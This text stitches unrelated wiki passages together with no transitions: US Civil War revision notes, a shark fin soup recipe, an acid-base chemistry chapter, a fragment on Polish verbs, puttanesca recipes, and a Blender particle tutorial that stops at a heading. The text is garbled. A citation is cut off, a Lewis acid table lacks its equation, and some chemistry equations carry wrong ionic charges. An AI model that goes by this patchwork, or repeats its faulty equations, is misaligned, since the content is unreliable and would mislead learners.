'Bleeding Kansas' a minor civil war over whether to be free or slave, eventually in 1858 after a referendum the pro-slavery group was defeated.

1857: Dred Scott Case.  The Supreme Court rules that slavery could exist throughout the union, this implied that the Missouri Compromise was ubconstitutional.

Rise of the Republican Party.  The Republican Party became a fully sectional party and led to a further identication with North or South rather than with the Union, Abraham Lincoln was influential in the Douglas-Lincoln debates in splitting the democratic party.

1860: Lincoln wins the presidential election, with only 40% of the popular vote.  A complete sectinal victory, and in December South Carolina secedes from the Union, followed by 6 other states.

1861: The confederacy was formed.  Lincoln rejected any compromise such as the Crittenden Proposals.
&quot;Given the momentum of succession and the fundamental set of Republicanism, it is probably safe to say that compromise was impossible from the start&quot; David Potter.

April: Fort Sumter, remained loyal to the Union.  Lincoln chose to re-provision, and Davies demanded surrender.  When Anderson refused shots were fired at 4:30am until he surrended 33 hours later.

&quot;The social systems of slave labour and free labour 'are more than incongrous - they are incompatible', the friction between them is 'an irreconcilable conflict between opposing and endring forces.'&quot; Seward.
&quot;The Civil War was 'The Repressible Conflict'&quot; Craven (revisionist)
- it could have been avoided had serious attempts been made to diffuse the situation, failure of the leaders to responsibly handle the situation.

'''Shark Fin Soup''', or '''Shark Fin Stew''', is [[Cookbook:Fish|fish]] [[Cookbook:Soup|soup]] believed to originate from China. On the Chinese seas during the 1800s, pirates under the control of Ch'ing Yih Szaou used to make shark fin soup that took at least 4 hours to prepare. &lt;ref&gt;{{cite book |last1=Klausmann |first1=Ulrike |last2=Meinzerin |first2=Marion |last3=Kuhn |first3=Gabriel |authorlink3=Gabriel_Kuhn |title=Women Pirates and the Politics of the Jolly Roger |format=book |accessdate=March 28, 2009 |edition=1st |year=1997 |publisher=Black Rose Books Ltd |location=C.P. 1258 Succ.

Recipes of shark fin soup vary, but shark fin is an essential ingredient.

==Ingredients==
===Soup===
*400 grams shark fins
*100 grams dried, ground shrimp
*10 large dried Dongu mushrooms
*50 grams dried bamboo shoots
*1 slice ginger root
*2 tablespoons bacon fat
*1 teaspoon salt
*2 tablespoons soy sauce
*4 tablespoons Chinese white wine
*3/4 litres chicken broth
*Fish stock from red-boiled fins
*1 teaspoon sesame oil
*1 tablespoon corn starch

==Procedure==
#Clean the fins, place in lukewarm water. 
#Soak ground shrimp and dried mushrooms for thirty minutes in 1/4 litre of warm water. The water can then be discarded. The dried bamboo should also be soaked until soft, then cut into thin strips.
#Thoroughly clean and scale the shark fins, place in a litre of water.
#Simmer for one hour. Afterwards set the water aside.
#Place fins in a fresh litre of water and bring to a boil.
#Reduce heat and simmer, covered, for an hour and a half. Afterwards strain fins.
#In a separate pot, add chicken broth and bring to a boil.
#Add ginger and shrimp, simmering for thirty minutes.
#Remove from heat and strain the broth, discarding the shrimp and ginger. 
#In a separate pot, heat the bacon fat, adding the bamboo shoots and mushrooms together with salt.
#Saute for one minute, then add soy sauce, wine, broth, fish stock, and fins. Boil under low heat, stirring frequently, for twenty minutes.
#Remove from heat and slowly stir in the corn starch, in small increments. Sprinkle sesame oil on the soup.

Serve in a large bowl. The shark fins should remain on the surface.

== Overview ==
To summarize the properties and behaviors of acids and bases, this chapter lists and explains the various chemical reactions that they undergo.  You may wish to review [[General Chemistry/Chemical equations|chemical equations]] and [[General Chemistry/Types of chemical reactions|types of reactions]] before attempting this chapter.

The following reactions are '''net ionic equations'''.  In other words, ''spectator ions'' are not written.  If an ion does not partake in the reaction, it is simply excluded.  The spectator ions can be found because they occur on both the reactant and the product side of the equation.  Cross them out and rewrite the equation without them.  Of course, the coefficients must be equal.

Canceling out the spectator ions explains the ''net'' of net ionic equations.  The ''ionic'' part means that dissolved compounds are written as ions instead of compounds.  Acids, bases, and salts are all ionic, so they are written as separate ions if they have dissociated.

{{TextBox|1=
;Net Ionic Equations
* Soluble salts are written as ions.
:: e.g.: Na&lt;sup&gt;+&lt;/sup&gt; + Cl&lt;sup&gt;-&lt;/sup&gt;
* Solids, liquids, and gases are written as compounds.
:: e.g.: NaCl&lt;sub&gt;(s)&lt;/sub&gt;, H&lt;sub&gt;2&lt;/sub&gt;O&lt;sub&gt;(l)&lt;/sub&gt;, HCl&lt;sub&gt;(g)&lt;/sub&gt;
* Strong acids and strong bases are written as ions (because they dissociate almost completely).
:: e.g.: H&lt;sup&gt;+&lt;/sup&gt; + NO&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;-&lt;/sup&gt;
* Weak acids and weak bases are written as compounds (because they barely dissociate).
:: e.g.: HNO&lt;sub&gt;2&lt;/sub&gt;
}}

As an example, sodium bicarbonate (NaHCO&lt;sub&gt;3&lt;/sub&gt;) would be written as Na&lt;sup&gt;+&lt;/sup&gt; and HCO&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;-&lt;/sup&gt; because the salt will dissociate, but the bicarbonate will not dissociate (it's a ''weak'' acid).

== Neutralization ==

When an acid and a base react, they form a neutral substance, often water and a salt.

First, let's examine the neutralization of a strong acid with a strong base.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{KOH} + \hbox{H}^+ + \hbox{Cl}^-&lt;/math&gt;
| Solid potassium hydroxide is added to an aqueous solution of hydrochloric acid.  Notice how the solid is written as a compound, but the acid is written as ions because it dissociates.
|-
| &lt;math&gt;\hbox{K}^+ + \hbox{OH}^- + \hbox{H}^+ + \hbox{Cl}^- \to \hbox{K}^+ + \hbox{Cl}^- + \hbox{H}_2\hbox{O}&lt;/math&gt;
| The hydrogen ions will react with hydroxide ions to form water.
|-
| &lt;math&gt;\hbox{H}^+ + \hbox{OH}^- \to \hbox{H}_2\hbox{O}&lt;/math&gt;
| Ignoring spectator ions, this is the ''net ionic equation''.
|}

{{Info|Whenever a strong acid neutralizes a strong base, the net ionic equation is always H&lt;sup&gt;+&lt;/sup&gt; + OH&lt;sup&gt;-&lt;/sup&gt; → H&lt;sub&gt;2&lt;/sub&gt;O}}

Now, let's see some examples involving weak acids and weak bases.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{PO}_4^{3-} + 3\hbox{H}^+ \to \hbox{H}_3\hbox{PO}_4&lt;/math&gt;
| Excess hydrochloric acid is added to a solution of sodium phosphate.  Phosphoric acid is weak, so the phosphate ions will react with hydrogen ions.  The result is a solution with some, but much less, hydrogen ions, so it is much closer to neutral than either of the original reactants.
|-
| &lt;math&gt;\hbox{PO}_4^{3-} + \hbox{H}^+ \to \hbox{H}\hbox{PO}_4^{-2}&lt;/math&gt;
| ''Equimolar'' amounts of sodium phosphate and hydrochloric acid are mixed.  Notice the difference between this reaction and the previous one.
|-
| &lt;math&gt;\hbox{HCO}_3^- + \hbox{OH}^- \to \hbox{H}_2\hbox{O} + \hbox{CO}_3^{-2}&lt;/math&gt;
| A strong base is added to a solution of calcium bicarbonate.  (Bicarbonate is a weak acid.)
|-
| &lt;math&gt;\hbox{HCO}_3^- + \hbox{H}^+ \to \hbox{H}_2\hbox{O} + \hbox{CO}_2&lt;/math&gt;
| A strong acid is added to a solution of calcium bicarbonate.  Gas bubbles appear.
|}

Many reactions result in the formation of gas bubbles or a solid precipitate that will make the solution cloudy.  The last equation brings up an interesting application.  Many rocks and minerals contain calcium carbonate or calcium bicarbonate.  To identify these rocks, geologists can perform the &quot;acid test&quot;.  A drop of acid is applied, and the presence of gas bubbles indicates carbonate.

{{Info|Many ions and compounds are '''amphoteric'''.  They can react with (or behave as) acids ''and'' bases.  Bicarbonate is a good example, as you can see by comparing the last two equations above.}}

Here are more examples of neutralization reactions.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{NH}_4\hbox{Cl} + \hbox{OH}^- \to \hbox{H}_2\hbox{O} + \hbox{NH}_3 + \hbox{Cl}^-&lt;/math&gt;
| Solid ammonium chloride crystals are dissolved into a solution of sodium hydroxide.  The smell of ammonia is detected.
|-
| &lt;math&gt;\hbox{NH}_3 + \hbox{H}^+ \to \hbox{NH}_4^+&lt;/math&gt;
| Ammonia gas is bubbled through a solution of hydrochloric acid.  This reaction is essentially the opposite of the previous.  In that reaction, ammonium ions react with base to form ammonia gas.  In this reaction, ammonia gas reacts with acid to form ammonium ions.
|-
| &lt;math&gt;\hbox{NH}_3 + \hbox{CH}_3\hbox{COOH} \to \hbox{NH}_4^+ + \hbox{CH}_3\hbox{COO}^-&lt;/math&gt;
| Ammonia (a weak base) reacts with acetic acid (also weak).  The resulting solution is nearly neutral, but it will be slightly basic because ammonia is stronger than acetic acid.
|-
| &lt;math&gt;\hbox{H}_2\hbox{S} + 2\hbox{OH}^- \to 2\hbox{H}_2\hbox{O} + \hbox{S}^{2-}&lt;/math&gt;
| Hydrogen sulfide gas is bubbled into a strong base.
|-
| &lt;math&gt;2\hbox{H}^+ + \hbox{S}^{2-} \to \hbox{H}_2\hbox{S}&lt;/math&gt;
| A strong acid is added to the above result, and hydrogen sulfide gas is released.
|}

== Anhydrides ==

An ''anhydride'' is a substance that does not contain water.  More specifically, it is a substance that reacts with water to form an acid or base.  Anhydrides are usually in the form of a gas that dissolves into water and reacts to form an acid or base.  They can also be solids that will react with water.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{N}_2\hbox{O}_5 + \hbox{H}_2\hbox{O} \to 2\hbox{H}^+ + 2\hbox{NO}_3^-&lt;/math&gt;
| Gaseous dinitrogen pentoxide is bubbled through water to form nitric acid.
|-
| &lt;math&gt;\hbox{N}_2\hbox{O}_3 + \hbox{H}_2\hbox{O} \to 2\hbox{HNO}_2&lt;/math&gt;
| Dinitrogen trioxide is mixed with water to form nitrous acid.
|}

The main difference between those two equations is the fact that nitrous acid is weak and thus does not dissociate, whereas nitric acid is strong and dissociates into ions.

Here are a few more examples of anhydride reactions.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{K}_2\hbox{O} + \hbox{H}_2\hbox{O} \to 2\hbox{K}^+ + 2\hbox{OH}^-&lt;/math&gt;
| Solid potassium oxide is added to water to form a strong base.
|-
|&lt;math&gt;\hbox{P}_2\hbox{O}_5 + 3\hbox{H}_2\hbox{O} \to 2\hbox{H}_3\hbox{PO}_4&lt;/math&gt;
| Phosphorus(V) oxide powder is mixed into water to form a weak acid.
|}

It is important to remember which acids are strong and which are weak.  [[General_Chemistry/Properties_and_Theories_of_Acids_and_Bases#Strong and Weak Acids/Bases|Review this]] if necessary.

{{Info|Anhydrides can also react with acidic or basic solutions.  In that case, you may find it helpful to first determine the anhydride's reaction with water, then determine that reaction with the acid or base.}}

For example, sulfur dioxide gas (acidic anhydride) is bubbled through a solution of calcium hydroxide (basic).
{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{SO}_2 + \hbox{H}_2\hbox{O} \to \hbox{H}_2\hbox{SO}_3&lt;/math&gt;
| First, determine the reaction of the anhydride with water.
|-
| &lt;math&gt;\hbox{H}_2\hbox{SO}_3 + \hbox{Ca}(\hbox{OH})_2 \to \hbox{CaSO}_3 + 2\hbox{H}_2\hbox{O}&lt;/math&gt;
| Then, determine the reaction of the acid and base.  This is a double replacement reaction.
|-
|&lt;math&gt;\hbox{SO}_2 + \hbox{H}_2\hbox{O} + \hbox{H}_2\hbox{SO}_3 + \hbox{Ca}(\hbox{OH})_2  \to \hbox{H}_2\hbox{SO}_3 + \hbox{CaSO}_3 + 2\hbox{H}_2\hbox{O}&lt;/math&gt;
| Add the two reactions together.
|-
|&lt;math&gt;\hbox{SO}_2 + \hbox{Ca}^{2-} + 2\hbox{OH}^- \to \hbox{CaSO}_3 + \hbox{H}_2\hbox{O}&lt;/math&gt;
| Cancel out spectators.  Also, calcium hydroxide should be ionized (but calcium sulfite is a solid precipitate).  This is the final ''net ionic equation''.
|}

Here are more examples.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{CaO} + 2\hbox{H}^+ \to \hbox{H}_2\hbox{O} + \hbox{Ca}^{2+}&lt;/math&gt;
| Calcium oxide crystals (basic anhydrides) are added to a strong acid.  Notice that it does not matter what the acid is (nitric, sulfuric, etc.) because it is strong and this reaction only requires the hydrogen ions.  In other words, the anions of the strong acid are spectators and are not written.
|-
| &lt;math&gt;\hbox{SO}_2 + \hbox{OH}^- \to \hbox{HSO}_3^-&lt;/math&gt;
| Excess sulfur dioxide gas is bubbled into a dilute solution of strong base.  The base is the limiting reactant.
|-
| &lt;math&gt;\hbox{SO}_2 + 2\hbox{OH}^- \to \hbox{H}_2\hbox{O} + \hbox{SO}_3^-&lt;/math&gt;
| Sulfur dioxide gas is bubbled into an excess of basic solution.
|}

Remember that water is involved in these reactions, but it not written if it occurs on both sides of the equation.

{{Info|Anhydrides can undergo neutralization reactions, even without the presence of water.}}

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{CaO} + \hbox{CO}_2 \to \hbox{CaCO}_3&lt;/math&gt;
| Solid calcium oxide (basic anhydride) is exposed to dry ice gas (acidic anhydride).  The resulting solid is a salt.
|-
| &lt;math&gt;\hbox{CaO} + \hbox{SO}_3 \to \hbox{CaSO}_4&lt;/math&gt;
| Solid calcium oxide is exposed to a stream of sulfur trioxde gas.  The resulting solid is a neutral salt.
|}

== Hydrolysis ==

A salt of a weak acid and strong base dissociates and reacts in water to form OH&lt;sup&gt;-&lt;/sup&gt;.  A salt of a strong acid and weak base dissociates and reacts in water to form H&lt;sup&gt;+&lt;/sup&gt;.  This process is called ''hydrolysis''.

In this first example, aluminum nitrate is dissolved in water.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{Al}(\hbox{NO}_3)_3 + \hbox{H}_2\hbox{O} \to \hbox{Al}^{3+} + 3\hbox{NO}_3^- + \hbox{H}_2\hbox{O}&lt;/math&gt;
| First, the salt dissociates in the water.  It isn't necessary to write H&lt;sub&gt;2&lt;/sub&gt;O in this reaction.
|-
| &lt;math&gt;\hbox{Al}^{3+} + \hbox{H}_2\hbox{O} \to \hbox{Al}(\hbox{OH})^{2+} + \hbox{H}^+&lt;/math&gt;
| Now, at least one of the ions will react with water.  You know that nitric acid is strong, so the nitrate ion will not take an H&lt;sup&gt;+&lt;/sup&gt; ion from water.  Instead, the aluminum ion will react with water, releasing a hydrogen ion.
|-
| &lt;math&gt;\hbox{Al}(\hbox{NO}_3)_3 + \hbox{H}_2\hbox{O} \to \hbox{Al}(\hbox{OH})^{2+} + \hbox{H}^+ + 3\hbox{NO}_3^- &lt;/math&gt;
| This is the ''net ionic equation''.  The resulting solution is acidic.
|}

The solution is acidic not because nitric acid is strong, but because aluminum is a weak base.

Here is an easier example.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{NaNO}_2 + \hbox{H}_2\hbox{O} \to \hbox{Na}^+ + \hbox{NO}_2^- + \hbox{H}_2\hbox{O}&lt;/math&gt;
| First, the salt dissociates.  Again, the H&lt;sub&gt;2&lt;/sub&gt;O need not be written.
|-
| &lt;math&gt;\hbox{NO}_2^- + \hbox{H}_2\hbox{O} \to \hbox{HNO}_2 + \hbox{OH}^-&lt;/math&gt;
| Sodium ions will not react with water.  Even if they did, they would form NaOH, which is a strong base, so it would immediately dissociate.  Instead, the NO&lt;sub&gt;2&lt;/sub&gt; reacts with water.  Being the conjugate of a weak acid, the nitrite ions will accept a proton from water to form nitrous acid (weak) and hydroxide ions (basic).
|-
| &lt;math&gt;\hbox{NaNO}_2 + \hbox{H}_2\hbox{O} \to \hbox{Na}^+ + \hbox{HNO}_2 + \hbox{OH}^-&lt;/math&gt;
| This is the net ionic equation for the hydrolysis of sodium nitrite.  The resulting solution is basic.
|}

{{Info|There is no hydrolysis reaction for ''neutral salts''.  Salts like NaCl and K&lt;sub&gt;2&lt;/sub&gt;SO&lt;sub&gt;4&lt;/sub&gt; (and any other composed of the conjugates of both a strong acid and strong base) will not react with water.  They create neutral solutions when dissolved.}}

== Lewis Acids/Bases ==

Lewis acids accept an electron pair.  Lewis bases donate an electron pair.  Together they react and bond to form an ''adduct''.

Lewis acids/bases do not require the presence of water.  However, H&lt;sup&gt;+&lt;/sup&gt; can be though of as a Lewis acid because it accepts electron pairs.  OH&lt;sup&gt;-&lt;/sup&gt; can donate an electron pair, making it a Lewis base.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;

| Boron trifluoride (Lewis acid) is exposed to ammonia (a Lewis base, as shown by the electron pair over the N).  The electron pair is shared between the nitrogen and boron, creating a bond. (The boron trifluoride is written backwards as F&lt;sub&gt;3&lt;/sub&gt;B only to demonstrate the B-N bond. Its structure has not changed.)

== Practice Problems ==
Write the net ionic equations for the following.  Make note of any solid precipitates or gas bubbles that would form.

# Equimolar solutions of sodium biphosphate and potassium hydroxide are mixed.
# Equimolar solutions of sodium biphosphate and hydrochloric acid are mixed.
# Excess sulfur dioxide gas is bubbled into a dilute solution of sodium hydroxide.  Acid is then added.
# Aluminum chloride is dissolved into water.
# Sodium fluoride is dissolved into water.  Strong acid is then added.
# Solid calcium oxide is exposed to a stream of sulfur trioxide gas.  If the resulting compound is dissolved, will the solution be acidic, basic, or neutral?
# Gaseous hydrogen chloride is bubbled into a solution of silver nitrate.
# Ammonium chloride crystals are dissolved in water.  Sodium hydroxide is then added.
# Calcium hydroxide crystals are dissolved into a solution of sodium bicarbonate.
# Phosphine gas is sprayed onto pebbles of aluminum trichloride. (Hint: these are Lewis acids/bases.)

      <text xml:space="preserve">There are many irregular and semi-irregular Polish verbs, but among the others, we can find some regularities - and we can divide them into four categories.

NOTE: The first example in each table is a perfective verb (when the action is complete), while the second one is an imperfective one (the action is in progress); the endings are the same, but the imperfective verbs have an extra syllable added between the verb root and the conjugated verb ending, as shown below.

'''''Spaghetti alla puttanesca''''' (Italian: &quot;whore's spaghetti&quot;) is a spicy, tangy and somewhat salty [[wikipedia:Italian cuisine|Italian]] [[cookbook:pasta|pasta]] dish. Italians refer to the sauce as ''sugo alla puttanesca''.

The earliest reference to  ''spaghetti alla puttanesca'' in print, cited by the ''Grande dizionario della lingua italiana'', occurred in Raffaele La Capria’s 1961 novel ''Ferito a morte''. Also, Italy's Professional Association of Pasta Makers agrees the sauce became popular in the 1960s.&lt;ref&gt;[http://www.unipi-pasta.it/PASTADAY/CART2006/art1.htm Unione Industriali Pastai Italiani]&lt;/ref&gt;
==Origin==
According to Annarita Cuomo, writer for ''Il Golfo'', a newspaper serving the Italian islands of [[wikipedia:Ischia|Ischia]] and [[wikipedia:Procida|Procida]], ''sugo alla puttanesca'' was invented in the 1950s by Sandro Petti, co-owner of ''Rancio Fellone'', a famous Ischian restaurant and nightspot.&lt;ref&gt;[http://www.ilgolfo.it/t/storehtm/htm19/17Feb0501f Annarita Cuomo's story on the origin of ''spaghetti alla puttanesca'']&lt;/ref&gt;

The moment of inspiration came, writes Cuomo, when near closing one evening Petti found a group of hungry friends sitting at one of his tables. Petti was low on ingredients and told them he didn't have enough to make them a meal. They complained that it was late and they were hungry. &quot;''Facci una puttanata qualsiasi''&quot; (“make any kind of garbage”), they insisted. In this usage, ''puttanata'' is a noun meaning garbage or something worthless. It is also derived from the Italian word ''puttana'', meaning whore.

Petti had nothing more than four tomatoes, two olives and some [[wikipedia:caper|capers]]; the basic ingredients for the ''sugo''. “So I used them to make the sauce for the spaghetti,” Petti told Cuomo.

Later, Petti included the dish on his menu as ''spaghetti alla puttanesca''.

==Cooking with chili peppers==
This recipe calls for chili peppers. Choosing the right quantity and type of pepper depends on your personal taste and a bit of trial and error. For this dish, most chefs use peppers in the moderate range of the [[wikipedia:Scoville scale#List_of_Scoville_ratings|Scoville scale]]. Use one or one and a half small peppers the first time you make this recipe. Use one and a half or two small peppers if your first attempt at making ''sugo'' leaves you craving more pepper heat. Keep increasing the number of peppers until you get it right. Most chefs stop at three.

==Recipes==
Ingredients vary a bit among chefs and cooks according to individual tastes. However, the version from [[wikipedia:Lazio|Lazio]] always includes [[wikipedia:anchovy|anchovies]] while the Neapolitan version never does.&lt;ref&gt;[http://www.portanapoli.com/Ita/Cucina/ga_puttanesca.html Neapolitan recipe for ''spaghetti alla puttanesca'' on ''Portonapoli'']&lt;/ref&gt;&lt;ref&gt;[http://www.accademiaitalianacucina.it/ricetta.php?id=889 Recipe on the site for the ''Accademia Italiana della Cucina'']&lt;/ref&gt;

An Italian-American version of this dish has emerged that omits butter and oregano but includes onions, anchovies and chili peppers.&lt;ref&gt;[http://www.mediterrasian.com/delicious_recipes_pasta_puta.htm ''Pasta puttanesca'' recipe on Mediterrasian.com]&lt;/ref&gt; Also, Americans tend to call the Italian-American version ''pasta puttanesca'' rather than ''spaghetti alla puttanesca''.

Finally, both recipes below contain very little protein. However, shrimp and scallops [[wikipedia:sautéd|sautéd]] in olive oil go beautifully with this dish. If you can't eat shellfish then add [[w:Tuna#Canned tuna|canned tuna]] or broiled [[cookbook:salmon|salmon]] to the pasta before coating it with ''sugo''.

==Lazio's recipe (serves six to eight)==
===Ingredients===
*600 grams (21 ounces) of spaghetti
*50 grams (1.75 ounces) of butter
*3 tablespoons of extra virgin olive oil
*6 unsalted anchovy fillets, crushed into a paste (omit anchovies for Neapolitan version)
*3 cloves of garlic, finely chopped 
*200 grams (7 ounces) of black olives, pitted and chopped 
*1 tablespoon of salted capers, washed well and coarsly chopped
*1 to 3 small dried chili peppers, chopped (optional)
*600 grams (21 ounces) plum tomatoes, peeled and [[wikipedia:purée|puréed]]
*1 tablespoon of chopped parsley
*salt to taste

===Procedure===
#Put the following in a skillet: butter, olive oil, garlic and anchovy paste.
#Before the garlic browns, add the olives, capers, tomato sauce and chili peppers.
#Add two to three pinches of salt, mixing at high heat.
#Meanwhile, cook the spaghetti in salt water (at least 4 quarts of water per pound of spaghetti being cooked). Strain it when it's [[wikipedia:al dente|''al dente'']]. Place it in a large serving bowl and coat it with sauce. Then sprinkle it with chopped parsley.
#Mix and serve hot.

==Italian-American recipe (serves two)==
===Ingredients===
*3 tablespoons olive oil
*6 ounces (170 grams) onions, finely chopped
*2 cloves garlic, minced
*4 anchovy fillets chopped or 2 teaspoons anchovy paste
*2 teaspoons capers, thoroughly rinsed
*1 to 3 fresh or dried chili peppers, deseeded and finely chopped (See information above on choosing hot peppers.)
*8 large pitted black or kalamata olives, quartered
*14 ounces (400 grams) plum tomatoes, diced 
*salt (1 tablespoon for boiling water, 1 teaspoon for sauce)
*1/4 teaspoon freshly ground black pepper
*1 tablespoon finely chopped parsley
*7 ounces (200 grams) dry spaghetti or linguine

===Procedure===
#Fill a large pot with two quarts of water and add two tablespoons of salt.
#Set heat on high to boil water.
#Heat two tablespoons of oil in a large skillet over medium heat.
#Add onions to skillet and cook for six minutes, stirring occasionally. Be careful not to burn the onions.
#Add garlic and anchovies to skillet. 
#Cook for one minute maximum, stirring to break up the anchovies. 
#Add capers, chili peppers, olives, tomatoes, pepper and 1/2 teaspoon of salt to skillet.
#Bring to a boil then reduce heat to medium-low and simmer, uncovered, for 10 minutes, stirring occasionally. 
#Boil the pasta until ''al dente'' while the sauce is simmering. This should take about 12 minutes.
#Drain the cooked pasta in a [[wikipedia:colander|colander]] and put the sauce in the bottom of the pot.
#Top with the cooked pasta, parsley and one tablespoon of olive oil.
#Toss until pasta is thoroughly coated with ''sugo''.

==For both recipes==
Italians customarily do not top this dish with grated cheese.

&lt;td&gt;[[File:Blender3D ParticlesShapingObjects-2.48a.ogv|none|thumb|400px|'''Image 1a:''' Particles can move to the position of other particles with ''Keyed'' physics.]]&lt;/td&gt;
&lt;td&gt;[[File:Blender3D TransientTextHarmonicFields.ogg|none|thumb|400px|'''Image 1b:''' Particles can react to force fields of other particles.]]&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

I will show on this page two ways to let particles take the shape of other objects.
# keyed particle physics ('''Img.&amp;nbsp;1a''')
# a harmonic force field with a damping of 1. The force field is emitted by another particle system, so that each particle is attracted by another particle ('''Img.&amp;nbsp;1b'''). 

;v2.48: The second method is easier to control, but I've found that it may not work exact enough. Even if you use RK4 as calculation method, there are some glitches in the precision of the calculation, so that your particles may not come to a standstill (depending on the size of the particles and their number this may be visible or not). 
;v2.49: That the particles didn't come to a standstill has been a bug that Jahka has fixed in 2.49. So if you use Version 2.49 and upwards you will find it easier to work with the harmonic force field.

{{B3D:N2P/Note|'''Plan Ahead!'''

Make it easy for yourself. If you know beforehand what will happen at each important frame, you will save a lot of time fiddling with the parameters.}}

== Keyed Physics ==
So here we're going to use keyed particle physics and quite a few different particle systems.

Basically this is the way to go:

* Use mesh objects and let them emit particles.
* Each system moves to another system because of the keyed physics.
* Choose a good visualization of the particles and animate that also. 
* At last the hard part: sync the different animations. 

The animation shall last 300 frames, this will be 12 seconds. 
:- In the first 2 seconds the word &quot;Blender&quot; shall appear (frame 1 to 50).
:- Than Suzanne shall build up in 3 seconds (frame 51 to 150).
:- Suzanne shall be clearly visible for a few frames (frame 151 to 200).
:- After that the form shall dissolve and the particles move a bit until they vanish (frame 200 to 300)

=== Preparing the scene ===
* Remove the cube.
* Add a text object ''Blender''. Name it ''Blender-first''.
* Add a ''Suzanne'' (''Add-&gt;Mesh-&gt;Monkey'').  Name it ''Suzanne-first''.
* Convert the text object to a meshobject, because only mesh objects can emit particles (menu: ''Object-&gt;Convert Object Type-&gt;Mesh'').
* Move the objects to their final positions, also the camera.
*'''Clarification required - what are the final positions?''' ('''Noob note''': the author probably means to move the camera and objects to a right position for viewing the animation correctly.)

We need every visible object twice. 
* Duplicate ''Blender-first'' and call the duplicate ''Blender-last''.
* Duplicate ''Suzanne-first'' and call the duplicate ''Suzanne-last''.

One problem is that the objects have different sizes. So how many particles shall be used to create a clearly visible form? Since the most difficult object is Suzanne, I have first chosen an acceptable representation and set everything else accordingly. But I will discuss the settings of the objects in order, and not in the way I did it in reality.

=== Set up the particle systems ===
'''Blender-first:'''
* Add a particle system to ''Blender-first''.
** Amount ''20.000''
** ''Sta:'' 1, ''End:'' 50, ''Life:'' 50
* ''Emit from:''
** ''Random/Faces/Even/Random''
 
Leave all other settings at default. This object will appear in the first 50 frames. After that the object has to vanish in the 51th frame. 
* Insert a layer key for ''Blender-first'' in frame 50 (mouse over the 3D window, '''I'''-&gt;''Layer''). 
* Change to frame 51. 
* Move the object to layer 20 ('''M'''-&gt;select layer, bottom right box). Make that layer visible. 
* Insert the next layer key for the object. 
* Make layer 20 invisible again (select layer 1).
* Change back to frame 1.

'''Suzanne-first'''
* Add a particle system.
** Amount ''20.000''
** ''Sta:'' 50, ''End:'' 100, ''Life:'' 200 (we don't need this long life but the lifetime doesn't matter as long as it's long enough)
* ''Emit from:''
** ''Random/Faces/Even/Random''
* ''Visualization: None'' 
Leave all other settings as default. These particles shall not move and they shall not be visible. They are simply a target to the next system. 

* Animate the layer of this object also. Move it out of sight in frame 151. 

'''Blender-last'''

These particles shall move from the shape &quot;Blender&quot; to the &quot;Suzanne&quot; shape.
* Add a particle system to ''Blender-last''.
** Amount ''20.000''
** ''Sta:'' 51, ''End:'' 51, ''Life:'' 100
* ''Emit from:''
** ''Random/Faces/Even/Random''
* Physics: 
** ''First/Keyed'' It is the first system of a chain (a very short chain in this example) of systems.
** ''Keyed Target:'' Suzanne-first, ''Psys:'' 1. Target is the first particle system of &quot;Suzanne-first&quot;.
* Set time to ''Absolute'' in the ''Extras'' panel. We're going to animate the material of the particles, I want all particles to change at once in a certain frame.
[[File:Blender3D FirstKeyedSystem-2.48a.png|framed|none|'''Image 2a:''' Particle system of the first keyed system.]]

'''Suzanne-last'''

These particles shall dissolve the form, so at first they take the shape and move around randomly afterwards.
* Add a particle system to ''Suzanne-last''.
** Amount ''20.000''
** ''Sta:'' 151, ''End:'' 151, ''Life:'' 150, ''Rand:'' 0.5. The lifetime is randomized from 151/2 to 151 frames. [Noob Note: In 2.49a, you can't set the start later than the end, so you must first change the end to 151, then change the start.]
* ''Emit from:''
** ''Random/Faces/Even/Random''
* ''Bake:'' ''End'' frame 300. Though we don't use baking here, you have to set the ''End'' frame in the ''Bake'' panel. Else the last 50 frames wouldn't be calculated.
* ''Time: Absolute''
[[File:Blender3D BrownianMotionAnimation-2.48a.png|framed|'''Image 2b:''' Animation of Brownian Motion]]
Animate the Brownian motion of the particles. 
* Open an ''Ipo'' window.
* Select ''Ipo Type'' particles.
* Select the ''Brown'' channel ('''LMB''').
* '''Ctrl-Click''' with the left mouse button in the ''Ipo'' window to create an Ipo-key for the selected channel.
* Create a curve similar to '''Img.&amp;nbsp;2b'''. '''Brown''' = 0 to frame 200, than increase to '''Brown''' = 4 in frame 217. 

{{clr}}

=== Material ===
Blender-first and Blender-last will get the same material, Suzanne-first is invisible anyway, but Suzanne-last will get a material. The material of the three objects is very similar, but I have animated the visibility of the particles to match the brightness of the objects. 

[[File:Blender3D ParticleMaterialForKeyedSystem-2.48a.png|framed|none|'''Image 2c:''' Material settings for the particles]]
'''Suzanne-last'''&lt;br /&gt;
* Create a simple ''Halo'' material like that in '''Img.&amp;nbsp;2c'''. 
This is nothing special, relatively small particles with a relatively &quot;sharp&quot; edge. The ''Add'' parameter gives more brightness if particles overlap, I think this is a nice effect here.

'''Blender-first'''
* Assign the material also to &quot;Blender-first&quot;.
* Make the material a ''Single User Copy'' by clicking on the small number next to the material name.
* Set ''Alpha'' to 0.438.

'''Blender-last'''
* Assign the &quot;Blender-first&quot; also to ''Blender-last&quot;.
* Make the material a ''Single User Copy'' by clicking on the small number next to the material name.
* Animate the alpha value of the material. 
** Insert an ''Ipo'' key for ''Alpha'' in frame 50. 
** Change to frame 150.
** Set ''Alpha'' to 1.
** Insert an ''Ipo'' key for ''Alpha''.
Now the brightness of all systems are matched.

== Harmonic Force Fields ==
